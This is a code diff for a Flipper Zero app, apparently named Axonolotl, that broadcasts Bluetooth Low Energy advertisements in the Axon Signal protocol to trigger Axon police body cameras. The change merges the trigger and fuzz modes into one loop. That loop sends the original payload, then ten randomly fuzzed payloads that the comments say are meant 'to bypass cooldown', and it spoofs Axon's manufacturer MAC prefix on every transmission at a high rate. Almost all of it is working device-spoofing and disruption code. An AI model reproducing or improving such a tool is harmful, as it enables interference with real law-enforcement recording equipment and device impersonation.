@@ -9,6 +9,14 @@
  * 
  * This tool broadcasts BLE advertisements using the Axon Signal protocol
  * to trigger Axon body cameras via Bluetooth Low Energy.
+ * 
+ * Broadcast pattern:
+ *   - Send original payload
+ *   - Send 10 fuzzed payloads (to bypass cooldown)
+ *   - Repeat
+ * 
+ * Each transmission uses the Axon OUI (00:25:DF) as MAC prefix
+ * with randomized lower 3 bytes for each broadcast.
  */
 
 #include "axonolotl.h"
@@ -19,13 +27,9 @@ void axonolotl_scene_menu_on_enter(void* context);
 bool axonolotl_scene_menu_on_event(void* context, SceneManagerEvent event);
 void axonolotl_scene_menu_on_exit(void* context);
 
-void axonolotl_scene_tx_on_enter(void* context);
-bool axonolotl_scene_tx_on_event(void* context, SceneManagerEvent event);
-void axonolotl_scene_tx_on_exit(void* context);
-
-void axonolotl_scene_fuzz_on_enter(void* context);
-bool axonolotl_scene_fuzz_on_event(void* context, SceneManagerEvent event);
-void axonolotl_scene_fuzz_on_exit(void* context);
+void axonolotl_scene_broadcast_on_enter(void* context);
+bool axonolotl_scene_broadcast_on_event(void* context, SceneManagerEvent event);
+void axonolotl_scene_broadcast_on_exit(void* context);
 
 void axonolotl_scene_about_on_enter(void* context);
 bool axonolotl_scene_about_on_event(void* context, SceneManagerEvent event);
@@ -34,22 +38,19 @@ void axonolotl_scene_about_on_exit(void* context);
 // Scene handlers table
 void (*const axonolotl_scene_on_enter_handlers[])(void*) = {
     axonolotl_scene_menu_on_enter,
-    axonolotl_scene_tx_on_enter,
-    axonolotl_scene_fuzz_on_enter,
+    axonolotl_scene_broadcast_on_enter,
     axonolotl_scene_about_on_enter,
 };
 
 bool (*const axonolotl_scene_on_event_handlers[])(void*, SceneManagerEvent) = {
     axonolotl_scene_menu_on_event,
-    axonolotl_scene_tx_on_event,
-    axonolotl_scene_fuzz_on_event,
+    axonolotl_scene_broadcast_on_event,
     axonolotl_scene_about_on_event,
 };
 
 void (*const axonolotl_scene_on_exit_handlers[])(void*) = {
     axonolotl_scene_menu_on_exit,
-    axonolotl_scene_tx_on_exit,
-    axonolotl_scene_fuzz_on_exit,
+    axonolotl_scene_broadcast_on_exit,
     axonolotl_scene_about_on_exit,
 };
 
@@ -74,56 +75,88 @@ static bool axonolotl_back_callback(void* context) {
 }
 
 /*
- * Update service data with fuzz values
- * 
- * From MainActivity.kt lines 303-321:
- * 
- *   private fun updateServiceDataWithFuzz() {
- *       currentServiceData = BASE_SERVICE_DATA.copyOf()
- *       currentServiceData[10] = ((fuzzValue shr 8) and 0xFF).toByte()
- *       currentServiceData[11] = (fuzzValue and 0xFF).toByte()
- *       currentServiceData[20] = ((fuzzValue shr 4) and 0xFF).toByte()
- *       currentServiceData[21] = ((fuzzValue shl 4) and 0xFF).toByte()
- *   }
+ * Prepare the original (unfuzzed) payload
  */
-void axonolotl_update_fuzz_data(Axonolotl* app) {
+void axonolotl_prepare_original_payload(Axonolotl* app) {
     furi_assert(app);
-    
-    // Copy base data
     memcpy(app->current_data, AXON_BASE_SERVICE_DATA, AXON_SERVICE_DATA_LEN);
-    
-    // Apply fuzz mutations exactly as in original source
-    app->current_data[FUZZ_BYTE_10] = (app->fuzz_value >> 8) & 0xFF;
-    app->current_data[FUZZ_BYTE_11] = app->fuzz_value & 0xFF;
-    app->current_data[FUZZ_BYTE_20] = (app->fuzz_value >> 4) & 0xFF;
-    app->current_data[FUZZ_BYTE_21] = (app->fuzz_value << 4) & 0xFF;
+    app->current_fuzz_value = 0;
 }
 
 /*
- * Start BLE advertising
+ * Prepare a fuzzed payload with random fuzz value
  * 
- * From MainActivity.kt lines 355-380:
- * Uses Service Data (not manufacturer data) with UUID 0xFE6C
+ * From MainActivity.kt lines 303-321:
+ * Uses random fuzz value instead of sequential increment
+ * to maximize variation in cooldown bypass attempts.
  */
-bool axonolotl_start_advertising(Axonolotl* app) {
+void axonolotl_prepare_fuzzed_payload(Axonolotl* app) {
     furi_assert(app);
     
-    if(app->is_advertising) {
-        axonolotl_stop_advertising(app);
-    }
+    // Start with base data
+    memcpy(app->current_data, AXON_BASE_SERVICE_DATA, AXON_SERVICE_DATA_LEN);
     
-    // Configure beacon
+    // Generate random 16-bit fuzz value
+    uint8_t rand_bytes[2];
+    furi_hal_random_fill_buf(rand_bytes, 2);
+    app->current_fuzz_value = (rand_bytes[0] << 8) | rand_bytes[1];
+    
+    // Apply fuzz mutations exactly as in original source
+    app->current_data[FUZZ_BYTE_10] = (app->current_fuzz_value >> 8) & 0xFF;
+    app->current_data[FUZZ_BYTE_11] = app->current_fuzz_value & 0xFF;
+    app->current_data[FUZZ_BYTE_20] = (app->current_fuzz_value >> 4) & 0xFF;
+    app->current_data[FUZZ_BYTE_21] = (app->current_fuzz_value << 4) & 0xFF;
+}
+
+/*
+ * Send a single BLE broadcast
+ * 
+ * Each call:
+ * - Generates a new random MAC address with Axon OUI prefix (00:25:DF)
+ * - Configures and starts the beacon
+ * - Returns true on success
+ * 
+ * MAC address format:
+ *   Bytes 0-2: Axon OUI (00:25:DF) - identifies as Axon device
+ *   Bytes 3-5: Random - new for each transmission
+ */
+bool axonolotl_send_single_broadcast(Axonolotl* app) {
+    furi_assert(app);
+    
+    // Stop any existing beacon first
+    furi_hal_bt_extra_beacon_stop();
+    
+    // Configure beacon with new random MAC (Axon OUI prefix)
     GapExtraBeaconConfig config = {
-        .min_adv_interval_ms = 100,
-        .max_adv_interval_ms = 150,
+        .min_adv_interval_ms = 50,
+        .max_adv_interval_ms = 50,
         .adv_channel_map = GapAdvChannelMapAll,
         .adv_power_level = GapAdvPowerLevel_6dBm,
         .address_type = GapAddressTypeRandom,
     };
     
-    // Random MAC address
-    furi_hal_random_fill_buf(config.address, 6);
-    config.address[0] |= 0xC0;
+    /*
+     * Generate MAC address with Axon OUI prefix
+     * 
+     * OUI: 00:25:DF (Axon Enterprise, Inc.)
+     * Verified from:
+     *   - MainActivity.kt line 38: TARGET_OUI = "00:25:DF"
+     *   - IEEE OUI registry lookup
+     * 
+     * For BLE random addresses, the two MSBs of byte 0 indicate the type:
+     *   11 = Static random address
+     *   01 = Resolvable private address  
+     *   00 = Non-resolvable private address
+     * 
+     * Axon OUI byte 0 is 0x00, which has MSBs = 00 (non-resolvable private).
+     * This is acceptable for our use case.
+     */
+    config.address[0] = AXON_OUI_BYTE0;  // 0x00
+    config.address[1] = AXON_OUI_BYTE1;  // 0x25
+    config.address[2] = AXON_OUI_BYTE2;  // 0xDF
+    
+    // Randomize lower 3 bytes
+    furi_hal_random_fill_buf(&config.address[3], 3);
     
     if(!furi_hal_bt_extra_beacon_set_config(&config)) {
         FURI_LOG_E(TAG, "Failed to set beacon config");
@@ -146,8 +179,8 @@ bool axonolotl_start_advertising(Axonolotl* app) {
     uint8_t svc_data_len = 1 + 2 + AXON_SERVICE_DATA_LEN;  // type + uuid + data
     adv_data[pos++] = svc_data_len;
     adv_data[pos++] = 0x16;  // Service Data - 16 bit UUID
-    adv_data[pos++] = AXON_SERVICE_UUID_16 & 0xFF;         // UUID low byte
-    adv_data[pos++] = (AXON_SERVICE_UUID_16 >> 8) & 0xFF;  // UUID high byte
+    adv_data[pos++] = AXON_SERVICE_UUID_16 & 0xFF;         // UUID low byte (0x6C)
+    adv_data[pos++] = (AXON_SERVICE_UUID_16 >> 8) & 0xFF;  // UUID high byte (0xFE)
     memcpy(&adv_data[pos], app->current_data, AXON_SERVICE_DATA_LEN);
     pos += AXON_SERVICE_DATA_LEN;
     
@@ -161,40 +194,57 @@ bool axonolotl_start_advertising(Axonolotl* app) {
         return false;
     }
     
-    app->is_advertising = true;
-    FURI_LOG_I(TAG, "TX Started");
+    app->total_transmissions++;
+    
+    FURI_LOG_D(TAG, "TX #%lu: MAC=%02X:%02X:%02X:%02X:%02X:%02X Fuzz=0x%04X",
+        app->total_transmissions,
+        config.address[0], config.address[1], config.address[2],
+        config.address[3], config.address[4], config.address[5],
+        app->current_fuzz_value);
+    
     return true;
 }
 
-void axonolotl_stop_advertising(Axonolotl* app) {
+void axonolotl_stop_broadcasting(Axonolotl* app) {
     furi_assert(app);
     
-    if(app->is_advertising) {
+    if(app->is_broadcasting) {
+        furi_timer_stop(app->broadcast_timer);
         furi_hal_bt_extra_beacon_stop();
-        app->is_advertising = false;
-        FURI_LOG_I(TAG, "TX Stopped");
+        app->is_broadcasting = false;
+        FURI_LOG_I(TAG, "Broadcast stopped after %lu transmissions", app->total_transmissions);
     }
 }
 
 /*
- * Fuzz timer callback
+ * Broadcast timer callback - called every BROADCAST_INTERVAL_MS (100ms)
  * 
- * From MainActivity.kt lines 276-296 (startFuzzLoop):
- *   fuzzValue = (fuzzValue + 1) and 0xFFFF
+ * Pattern:
+ *   cycle_position 0: Send original payload
+ *   cycle_position 1-10: Send fuzzed payloads
+ *   Then reset to 0 and repeat
  */
-static void axonolotl_fuzz_timer_callback(void* context) {
+static void axonolotl_broadcast_timer_callback(void* context) {
     Axonolotl* app = context;
     
-    // Increment fuzz value with 16-bit wrap
-    app->fuzz_value = (app->fuzz_value + 1) & 0xFFFF;
+    // Prepare payload based on cycle position
+    if(app->cycle_position == 0) {
+        axonolotl_prepare_original_payload(app);
+    } else {
+        axonolotl_prepare_fuzzed_payload(app);
+    }
     
-    // Update data and restart advertising
-    axonolotl_update_fuzz_data(app);
-    axonolotl_stop_advertising(app);
-    axonolotl_start_advertising(app);
+    // Send the broadcast
+    axonolotl_send_single_broadcast(app);
+    
+    // Advance cycle position
+    app->cycle_position++;
+    if(app->cycle_position > FUZZ_COUNT_PER_CYCLE) {
+        app->cycle_position = 0;  // Reset to original payload
+    }
     
     // Trigger UI update
-    view_dispatcher_send_custom_event(app->view_dispatcher, AxonolotlEventFuzzTick);
+    view_dispatcher_send_custom_event(app->view_dispatcher, AxonolotlEventBroadcastTick);
 }
 
 // ============================================================================
@@ -202,19 +252,15 @@ static void axonolotl_fuzz_timer_callback(void* context) {
 // ============================================================================
 
 typedef enum {
-    MenuIndexTrigger,
-    MenuIndexFuzz,
+    MenuIndexBroadcast,
     MenuIndexAbout,
 } MenuIndex;
 
 static void axonolotl_menu_callback(void* context, uint32_t index) {
     Axonolotl* app = context;
     switch(index) {
-        case MenuIndexTrigger:
-            scene_manager_next_scene(app->scene_manager, AxonolotlSceneTx);
-            break;
-        case MenuIndexFuzz:
-            scene_manager_next_scene(app->scene_manager, AxonolotlSceneFuzz);
+        case MenuIndexBroadcast:
+            scene_manager_next_scene(app->scene_manager, AxonolotlSceneBroadcast);
             break;
         case MenuIndexAbout:
             scene_manager_next_scene(app->scene_manager, AxonolotlSceneAbout);
@@ -227,8 +273,7 @@ void axonolotl_scene_menu_on_enter(void* context) {
     
     submenu_reset(app->submenu);
     submenu_set_header(app->submenu, "Axonolotl");
-    submenu_add_item(app->submenu, "Trigger", MenuIndexTrigger, axonolotl_menu_callback, app);
-    submenu_add_item(app->submenu, "Fuzz Mode", MenuIndexFuzz, axonolotl_menu_callback, app);
+    submenu_add_item(app->submenu, "Broadcast", MenuIndexBroadcast, axonolotl_menu_callback, app);
     submenu_add_item(app->submenu, "About", MenuIndexAbout, axonolotl_menu_callback, app);
     
     view_dispatcher_switch_to_view(app->view_dispatcher, AxonolotlViewSubmenu);
@@ -246,98 +291,71 @@ void axonolotl_scene_menu_on_exit(void* context) {
 }
 
 // ============================================================================
-// Scene: TX (Single broadcast)
+// Scene: Broadcast (unified trigger + fuzz mode)
 // ============================================================================
 
-void axonolotl_scene_tx_on_enter(void* context) {
+static void axonolotl_update_broadcast_display(Axonolotl* app) {
+    static char text[96];
+    const char* mode = (app->cycle_position == 0) ? "ORIGINAL" : "FUZZED";
+    snprintf(text, sizeof(text), 
+        "TX: %lu\n"
+        "Mode: %s\n"
+        "Fuzz: 0x%04X\n"
+        "Press Back to stop", 
+        app->total_transmissions,
+        mode,
+        app->current_fuzz_value);
+    popup_set_text(app->popup, text, 64, 20, AlignCenter, AlignTop);
+}
+
+void axonolotl_scene_broadcast_on_enter(void* context) {
     Axonolotl* app = context;
     
-    // Use base service data (no fuzz)
-    memcpy(app->current_data, AXON_BASE_SERVICE_DATA, AXON_SERVICE_DATA_LEN);
+    // Initialize broadcast state
+    app->cycle_position = 0;
+    app->total_transmissions = 0;
+    app->current_fuzz_value = 0;
+    app->is_broadcasting = true;
     
-    if(axonolotl_start_advertising(app)) {
-        popup_set_header(app->popup, "TX ACTIVE", 64, 8, AlignCenter, AlignTop);
-        popup_set_text(app->popup, "Broadcasting\nAxon Signal...\nPress Back to stop", 64, 26, AlignCenter, AlignTop);
+    // Prepare and send first (original) payload immediately
+    axonolotl_prepare_original_payload(app);
+    
+    if(axonolotl_send_single_broadcast(app)) {
+        popup_set_header(app->popup, "BROADCASTING", 64, 4, AlignCenter, AlignTop);
+        axonolotl_update_broadcast_display(app);
+        
+        // Advance to first fuzz position for next tick
+        app->cycle_position = 1;
+        
+        // Start timer for subsequent broadcasts (100ms interval)
+        furi_timer_start(app->broadcast_timer, furi_ms_to_ticks(BROADCAST_INTERVAL_MS));
+        
+        // Green LED while broadcasting
         notification_message(app->notifications, &sequence_set_only_green_255);
     } else {
         popup_set_header(app->popup, "TX FAILED", 64, 8, AlignCenter, AlignTop);
         popup_set_text(app->popup, "Could not start\nBLE advertising", 64, 26, AlignCenter, AlignTop);
         notification_message(app->notifications, &sequence_set_only_red_255);
+        app->is_broadcasting = false;
     }
     
     view_dispatcher_switch_to_view(app->view_dispatcher, AxonolotlViewPopup);
 }
 
-bool axonolotl_scene_tx_on_event(void* context, SceneManagerEvent event) {
-    UNUSED(context);
-    UNUSED(event);
-    return false;
-}
-
-void axonolotl_scene_tx_on_exit(void* context) {
-    Axonolotl* app = context;
-    axonolotl_stop_advertising(app);
-    notification_message(app->notifications, &sequence_reset_rgb);
-    popup_reset(app->popup);
-}
-
-// ============================================================================
-// Scene: Fuzz Mode
-// ============================================================================
-
-static void axonolotl_update_fuzz_display(Axonolotl* app) {
-    static char text[80];
-    snprintf(text, sizeof(text), 
-        "Value: 0x%04X\n"
-        "Interval: 500ms\n"
-        "Press Back to stop", 
-        app->fuzz_value);
-    popup_set_text(app->popup, text, 64, 26, AlignCenter, AlignTop);
-}
-
-void axonolotl_scene_fuzz_on_enter(void* context) {
+bool axonolotl_scene_broadcast_on_event(void* context, SceneManagerEvent event) {
     Axonolotl* app = context;
     
-    // Initialize fuzz state (from line 265: fuzzValue = 0)
-    app->fuzz_value = 0;
-    app->is_fuzzing = true;
-    axonolotl_update_fuzz_data(app);
-    
-    if(axonolotl_start_advertising(app)) {
-        popup_set_header(app->popup, "FUZZ ACTIVE", 64, 8, AlignCenter, AlignTop);
-        axonolotl_update_fuzz_display(app);
-        
-        // Start fuzz timer (500ms interval from source)
-        furi_timer_start(app->fuzz_timer, furi_ms_to_ticks(FUZZ_INTERVAL_MS));
-        
-        // Magenta LED for fuzz mode
-        notification_message(app->notifications, &sequence_set_only_blue_255);
-        notification_message(app->notifications, &sequence_set_only_red_255);
-    } else {
-        popup_set_header(app->popup, "FUZZ FAILED", 64, 8, AlignCenter, AlignTop);
-        popup_set_text(app->popup, "Could not start\nBLE advertising", 64, 26, AlignCenter, AlignTop);
-        notification_message(app->notifications, &sequence_set_only_red_255);
-    }
-    
-    view_dispatcher_switch_to_view(app->view_dispatcher, AxonolotlViewPopup);
-}
-
-bool axonolotl_scene_fuzz_on_event(void* context, SceneManagerEvent event) {
-    Axonolotl* app = context;
-    
-    if(event.type == SceneManagerEventTypeCustom && event.event == AxonolotlEventFuzzTick) {
-        axonolotl_update_fuzz_display(app);
+    if(event.type == SceneManagerEventTypeCustom && event.event == AxonolotlEventBroadcastTick) {
+        axonolotl_update_broadcast_display(app);
         return true;
     }
     return false;
 }
 
-void axonolotl_scene_fuzz_on_exit(void* context) {
+void axonolotl_scene_broadcast_on_exit(void* context) {
     Axonolotl* app = context;
     
-    furi_timer_stop(app->fuzz_timer);
-    app->is_fuzzing = false;
-    axonolotl_stop_advertising(app);
+    axonolotl_stop_broadcasting(app);
     notification_message(app->notifications, &sequence_reset_rgb);
     popup_reset(app->popup);
 }
@@ -361,6 +379,7 @@ void axonolotl_scene_about_on_enter(void* context) {
         app->widget, 0, 16, 128, 48,
         "\ecAxonCadabra Port\n"
         "\ecfor Flipper Zero\n"
+        "\ecv1.1\n"
         "\n"
         "\e#Original:\n"
         "withlovefromminneapolis\n"
@@ -393,9 +412,10 @@ Axonolotl* axonolotl_alloc(void) {
     Axonolotl* app = malloc(sizeof(Axonolotl));
     
     // Initialize state
-    app->is_advertising = false;
-    app->is_fuzzing = false;
-    app->fuzz_value = 0;
+    app->is_broadcasting = false;
+    app->cycle_position = 0;
+    app->total_transmissions = 0;
+    app->current_fuzz_value = 0;
     memcpy(app->current_data, AXON_BASE_SERVICE_DATA, AXON_SERVICE_DATA_LEN);
     
     // Open services
@@ -422,8 +442,8 @@ Axonolotl* axonolotl_alloc(void) {
     app->widget = widget_alloc();
     view_dispatcher_add_view(app->view_dispatcher, AxonolotlViewWidget, widget_get_view(app->widget));
     
-    // Create fuzz timer
-    app->fuzz_timer = furi_timer_alloc(axonolotl_fuzz_timer_callback, FuriTimerTypePeriodic, app);
+    // Create broadcast timer
+    app->broadcast_timer = furi_timer_alloc(axonolotl_broadcast_timer_callback, FuriTimerTypePeriodic, app);
     
     return app;
 }
@@ -432,11 +452,11 @@ void axonolotl_free(Axonolotl* app) {
     furi_assert(app);
     
     // Stop operations
-    furi_timer_stop(app->fuzz_timer);
-    axonolotl_stop_advertising(app);
+    furi_timer_stop(app->broadcast_timer);
+    furi_hal_bt_extra_beacon_stop();
     
     // Free timer
-    furi_timer_free(app->fuzz_timer);
+    furi_timer_free(app->broadcast_timer);
     
     // Remove and free views
     view_dispatcher_remove_view(app->view_dispatcher, AxonolotlViewSubmenu);
